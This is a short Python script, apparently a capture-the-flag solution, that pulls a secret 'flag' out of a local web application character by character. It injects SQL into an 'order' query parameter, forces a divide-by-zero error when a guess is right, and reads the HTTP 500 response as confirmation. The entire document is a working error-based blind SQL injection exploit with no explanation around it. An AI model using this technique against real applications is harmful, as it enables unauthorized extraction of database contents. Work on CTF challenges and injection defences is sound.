import requests

base_url = 'http://127.0.0.1:1337'

session = requests.Session()

known = ''
while True:
    found = False
    for char in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-':
        res = session.get(base_url, params = {
            'order': f"= (SELECT CASE WHEN (SUBSTRING((SELECT flag FROM flag) FROM {len(known)+1} FOR 1) = '{char}') THEN (SELECT 1/(COUNT(*)-1) FROM flag) ELSE 0 END)"
        })
        if res.status_code == 500:
            known += char
            found = True
            break

    print(known)
    if not found:
        break